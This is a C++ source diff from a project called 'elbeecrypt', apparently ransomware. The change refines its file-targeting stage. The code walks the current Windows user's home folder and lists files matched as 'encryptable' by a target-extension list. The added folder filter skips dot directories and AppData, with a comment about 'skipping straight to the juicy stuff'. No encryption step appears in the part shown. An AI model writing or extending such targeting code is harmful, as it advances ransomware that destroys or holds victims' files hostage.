@@ -8,6 +8,7 @@
 
 #include "elbeecrypt/common/io/direntwalk.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
+#include "elbeecrypt/common/utils/string.hpp"
 
 //Platform-specific includes
 #if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
@@ -45,27 +46,30 @@ int main(int argc, char **argv){
 
 	//Define the lambda to collect the directory listings
 	auto fileConsumer = [](const fs::path& path){
-		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
+		if(common::targets::Extensions::isEncryptable(path)){
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	};
 
 	auto folderConsumer = [](const fs::path& path){
+		//Skip "." directories and AppData (skipping straight to the juicy stuff)
+		if(path.filename().string()[0] == '.') return false;
+		if(common::utils::String::toLowercase(path.filename().string()) == "appdata") return false;
 		return true;
 	};
 
 	//Call the walk function with the root path and the lambda
 	std::string uname(getenv("username"));
-	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
+	common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
 
 	vector<fs::path> paths = {};
 
-	elbeecrypt::common::io::DirentWalk::directoryList("C:\\Users\\", paths);
+	common::io::DirentWalk::directoryList("C:\\Users\\", paths);
 
 	cout << paths[0] << endl;
 
 	for(fs::path path : paths){
-		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
+		if(common::targets::Extensions::isEncryptable(path)){
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	}
